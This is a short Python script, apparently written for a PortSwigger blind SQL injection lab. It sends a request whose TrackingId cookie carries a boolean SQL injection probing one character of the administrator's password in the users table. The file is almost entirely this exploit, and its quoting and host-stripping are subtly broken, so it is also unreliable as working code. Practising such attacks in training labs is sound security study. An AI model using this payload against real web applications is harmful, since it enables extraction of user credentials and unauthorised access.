import requests

def tracking_id_inject():
    #User needs to insert the URL as PortSwigger creates a new URL when starting the lab.
    url = input("Enter Blind SQLi URL:")
    host = url.lstrip("https://")
    host = host.rstrip("/")
    print(host)
    #New Page each time means a different tracking ID
    trackingID = input("Enter TrackingId for requests:")
    #New page each time means a different sesesion code
    session = input("Enter session code:")
    
    headers = {
        'Host': host,
        'Cookie': 'TrackingId=' + trackingID + '\'and substring((select password from users where username = \'administrator\'),10,1) < \'a\; session=' + session,
        'Sec-Ch-Ua': '"Chromium";v="133", "Not(A:Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '\"Linux\"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': url,
        'Accept-Encoding': 'gzip, deflate, br',
        'Priority': 'u=0, i'
    }
    response = requests.get(url, headers=headers)
    print(response)



def main():
    tracking_id_inject()
    
if __name__ == "__main__":
    main()